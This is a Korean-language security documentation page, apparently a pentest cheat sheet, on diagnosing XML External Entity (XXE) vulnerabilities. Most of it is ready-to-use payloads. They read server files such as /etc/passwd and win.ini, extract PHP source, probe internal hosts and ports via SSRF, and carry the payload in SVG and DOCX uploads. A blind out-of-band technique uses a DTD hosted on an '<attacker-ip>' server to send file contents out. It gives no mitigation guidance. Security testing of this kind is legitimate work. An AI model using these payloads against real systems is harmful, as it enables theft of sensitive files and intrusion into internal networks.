---
sidebar_position: 7
title: XML External Entity (XXE)
---

# XML External Entity (XXE) 취약점 진단

## Overview

**XXE (XML External Entity)**: 웹 애플리케이션이 XML 문서를 처리할 때, 설정이 미흡한 XML 파서가 외부 엔티티(External Entity)를 해석하도록 허용하여 발생하는 서버 사이드 취약점

- **발생 위치**: XML 데이터 요청을 처리하는 API, SOAP 통신, 파일 업로드(SVG, DOCX) 등
- **위험성**: 로컬 파일 시스템 읽기(LFI), 내부망 스캔(SSRF), 드물게 원격 코드 실행(RCE) 및 DoS(Billion Laughs) 공격 가능

---

## 1. Reconnaissance (탐지 및 데이터 삽입)

### Content-Type 조작을 통한 XXE 트리거 유도
기본적으로 JSON으로 처리되는 API를 XML로 변경하여 파서 테스트
```http
POST /api/v1/user HTTP/1.1
Host: <target>
Content-Type: application/xml   # text/xml, application/soap+xml 등 활용 가능

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe "테스트 데이터">]>
<foo>&xxe;</foo>
```

---

## 2. Exploitation (공격 수행)

### 로컬 파일 읽기 (LFI via XXE)
SYSTEM 식별자와 file 프로토콜을 사용하여 서버 내부 민감 파일 추출
```xml
<!-- Linux 환경: /etc/passwd 탈취 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
<stockCheck>
    <productId>&passwd;</productId>
</stockCheck>

<!-- Windows 환경: 시스템 파일 탈취 -->
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order><item>&test;</item></order>

<!-- PHP Wrapper 활용 (Base64 인코딩으로 특수 문자 포함 소스 추출) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

### 내부망 포트 스캔 및 접근 (SSRF via XXE)
외부에서 접근할 수 없는 내부 인프라에 HTTP 요청 수행
```xml
<!-- 내부 관리자 페이지 접근 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin"> ]>

<!-- 내부 포트(22, 3306 등) 오픈 여부 스캔 (응답 지연 확인) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22"> ]>
```

---

## 3. Advanced Techniques

### Blind XXE (Out-of-Band Data Exfiltration)
결과가 화면에 반환되지 않는(Blind) 환경에서 공격자 서버로 데이터 유출

**1. 타겟 서버에 삽입할 페이로드:**
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://<attacker-ip>/evil.dtd">
  %xxe;
]>
<foo></foo>
```

**2. 공격자 서버에서 호스팅할 외부 DTD 파일 (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<attacker-ip>/?data=%file;'>">
%eval;
%exfiltrate;
```
※ 공격자 서버의 웹 로그(`/?data=root:x:0:0...`)를 통해 추출된 데이터를 확인

### 파일 포맷을 이용한 XXE (SVG, DOCX)
직접 XML 전송이 막혀 있을 경우, 내부적으로 XML을 사용하는 파일 업로드 기능 활용

**SVG 이미지를 이용한 XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX 파일을 이용한 XXE:**
1. 정상 DOCX 파일 압축 해제 (`unzip document.docx`)
2. 내부 `word/document.xml` 파일 상단에 DOCTYPE 및 XXE 엔티티 삽입
3. 다시 압축하여 업로드 (`zip -r payload.docx *`)

